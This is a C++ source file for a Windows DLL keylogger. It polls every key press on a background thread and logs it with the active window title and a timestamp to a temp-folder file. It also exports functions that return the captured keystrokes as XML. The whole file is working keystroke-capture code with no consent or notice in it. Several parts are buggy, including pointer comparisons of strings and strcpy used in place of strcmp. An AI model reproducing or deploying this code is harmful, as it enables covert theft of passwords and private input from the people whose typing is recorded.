// KLogger.cpp : Defines the exported functions for the DLL application.
#include "KLogger.h"

//If file exists then return true.

bool FileExists(const char *filename)

{
  ifstream ifile(filename);
  return (bool)ifile;
}

void AddTimeStamp()
{
	   ofstream keylog(logfile, ios::app);
             keylog << "\nTIMESTAMP";
			 keylog << iTimeStamp;
			 keylog << "\n";
}

//static APIs.....

void addTITLE(char* title)
{
	char date[128]={0},time[128]={0};
	ofstream keylog(logfile, ios::app);
    if(!firstCall)
      {			
			if (FileExists(logfile)) 
			{
				ofstream keylog(logfile, ios::trunc);
			}
			else
			{
				ofstream keylog(logfile, ios::out);
			}
			firstCall++;    
      }
      else
      {
         keylog << "</Entry>\n";
	  }

	  keylog << "<Entry AppName =\"";
      keylog << title;
      keylog << "\" time =\"";
	  _strdate_s( date, 128 );
   	  keylog << date;
  	  keylog << "-";
      _strtime_s( time, 128 );
  	  keylog << time;
	  keylog << "\">";
	  keylog.close();
}
int KeyLogger(char key)
{
	  if(!KLogStarted)
		  KLogStarted=true;
	  ofstream keylog(logfile, ios::app);
	  keylog << key;
	  keylog.close();
	  return 0;
}
void KeyCheck(void *k)
{
	 char key;
	 int pause;
	 DWORD retVal = 0;
 	 char title[MAX_PATH] = "sample";
	 LPWSTR st = new TCHAR[MAX_PATH];
	 char oldtitle[MAX_PATH];
	 
	 retVal = GetTempPathA(MAX_PATH, logfile);
	 if(retVal > MAX_PATH || retVal == 0)
	 {
		 return;
	 }
	 else
	 {
		strcat(logfile, "\log.txt");
	 }

     _tzset();

     GetWindowText(GetForegroundWindow(), st, GetWindowTextLength(GetForegroundWindow()) + 10);
	 wsprintfA(title,"%S",st);
	 sprintf(oldtitle,"%s",title);
	 if(title!="/" || title!="\\" || title!="")
	 {
     addTITLE(title);
	 }
	 while(1)
	 {
			  for(key = 32;key<=127;key++)
			  {
					GetWindowText(GetForegroundWindow(), st, GetWindowTextLength(GetForegroundWindow()) + 10);
					wsprintfA(title,"%S",st);
					if(strcmp(title,oldtitle))
                      {
					   if(title!="/" || title!="\\"|| title!="")
						{
							addTITLE(title);
						}
                       sprintf(oldtitle,"%s",title);
					  }
					  if (GetAsyncKeyState(key)==-32767)
					  {
						  switch(key){
							  //Just replace the hex code for whatever key you wish to discard here.
						  case VK_LBUTTON:
						  case VK_RBUTTON:
						  case VK_MBUTTON:
						  case VK_SHIFT:										
						  case VK_RETURN:
						  case VK_HOME:
						  case VK_END:
						  case VK_DELETE:
						  case VK_BACK:
						  case VK_TAB:
						  case VK_CONTROL:
						  case VK_ESCAPE:
						  case VK_UP:
						  case VK_DOWN:
						  case VK_RIGHT:
						  case VK_LEFT:
						  case VK_LWIN:
						  case VK_RWIN:
						  case VK_F1:
						  case VK_F2:
						  case VK_F3:
						  case VK_F4:
						  case VK_F5:
						  case VK_F6:
						  case VK_F7:
						  case VK_F8:
						  case VK_F9:
						  case VK_F10:
						  case VK_F11:
						  case VK_F12:
						  case VK_CAPITAL:break;
						  case VK_NUMPAD0: key='0'; KeyLogger(key); break;
						  case VK_NUMPAD1: key='1'; KeyLogger(key); break;
						  case VK_NUMPAD2: key='2'; KeyLogger(key); break;
						  case VK_NUMPAD3: key='3'; KeyLogger(key); break;
						  case VK_NUMPAD4: key='4'; KeyLogger(key); break;
						  case VK_NUMPAD5: key='5'; KeyLogger(key); break;
						  case VK_NUMPAD6: key='6'; KeyLogger(key); break;
						  case VK_NUMPAD7: key='7'; KeyLogger(key); break;
						  case VK_NUMPAD8: key='8'; KeyLogger(key); break;
						  case VK_NUMPAD9: key='9'; KeyLogger(key); break;
						  
							//left - virtual keycodes for pageup/pagedown - would need breakpoints and addition of a case
						  default:pause = KeyLogger(key); 
								break;
						  }
							
			  		  }
			  }
			  Sleep(2);
	 }

}

//Exposed APIs.....

DllExport void StartLogging()
{
	if(!isLogging)
	{
    hThread = (HANDLE)_beginthread(KeyCheck, 0, NULL);
	isLogging=true;
	}
}

DllExport void StopLogging()
{
	if(isLogging)
	{
	TerminateThread(hThread, 1);
    CloseHandle(hThread);
	isLogging = false;
	}
}

DllExport char* GetAllKeystrokes()
{	
	if(!KLogStarted)
		return "";
	  xmlBuffer = "";
      string str;
      string checktimestamp = "TIMESTAMP"+ iTimeStamp;
      fstream infile;

      xmlBuffer.append("<KeystrokeData version=\'1.0\'>\n");
	  infile.open(logfile);

      if(!iTimeStamp)
      {
          str.clear();
          getline(infile,str);
          while(infile)
          {
			  if(std::string::npos == str.find(reg_ex))
			{
             xmlBuffer.append(str);
			 xmlBuffer.append("\n");
			}
             str.clear();
             getline(infile,str);
          }
      }
      else
      {
          str.clear();
          getline(infile,str);
		  string titleNtimestamp;
          while(infile)
          {	
              if(0 == str.compare(checktimestamp))
                  {
                      break;
                  }
                  else if (0 == str.compare(0,16,"<Entry AppName ="))
                  {
                      titleNtimestamp = str;
                  }

                  str.clear();
                  getline(infile,str);
          }
          xmlBuffer.append(titleNtimestamp);
          while(infile)
          {
			  xmlBuffer.append(str);
			  str.clear();
			  getline(infile,str);           
          }
      }

      xmlBuffer.append("</Entry>\n");
      xmlBuffer.append("</KeystrokeData>");
      //AddTimeStamp();
      infile.close();
	  StopLogging();
	  infile.open(logfile, ios::out | ios::trunc);
	  infile.close();
	  StartLogging();
      iTimeStamp++;
	  //clear log buffer
	  KLogStarted=false;
      return (char*)xmlBuffer.c_str();
}

DllExport char* GetKeystrokes(int in_min)
{
	if(!KLogStarted)
		return "";
	// boundary conditions
	  if(in_min < 0 || in_min > 60)
	  {
		  return GetAllKeystrokes();
	  }

	  xmlBuffer = "";
	  string str;
	  char date[128]={0},time[128]={0};
	  char buffer[128]={0};
	  char buffer1[128]={0};
	  int total_min=0;
	  size_t found;
      ifstream infile;

	  _strdate_s( date, 128 );
	  _strtime_s( time, 128 );
	  total_min = 60*(time[1]-'0')+10*(time[3]-'0')+(time[4]-'0')-in_min;
	  time[1]='0'+total_min/60;
	  total_min %= 60;

	  if(total_min<10)
	  {
		time[3]='0'+total_min;
	  }
	  else
	  {
		time[3]='0'+total_min/10;
		time[4]='0'+total_min%10;
	  }
	  string timestamp("time =\"");
	  timestamp.append((const char*)date);
	  timestamp.append("-");
	  timestamp.append((const char*)time);
	  timestamp.append(">\"");
      xmlBuffer.append("<KeystrokeData version=1.0>\n");
      infile.open(logfile);
      str.clear();
      getline(infile,str);
	  string titleNtimestamp;

      while(infile)
      {
			if (0 == str.compare(0,16,"<Entry AppName ="))
            {
                 titleNtimestamp = str;
				 found=str.find("time =\"");
				 str.copy(buffer,26,(int)found);
				 timestamp.copy(buffer1,128,0);

				 if(strcpy(buffer,buffer1) < 0)
				 {
					 continue;
				 }
				 else
				 {
					 break;
				 }
            }
            str.clear();
            getline(infile,str);
      } 
      xmlBuffer.append(titleNtimestamp);
		
      while(infile)
      {
			  if(std::string::npos == str.find(reg_ex))
			{
             xmlBuffer.append(str);
			 xmlBuffer.append("\n");
			}
             str.clear();
             getline(infile,str);          
      }

      xmlBuffer.append("</Entry>\n");
      xmlBuffer.append("</KeystrokeData>");
      //AddTimeStamp();
      infile.close();
      iTimeStamp++;
      return (char*)xmlBuffer.c_str();
}



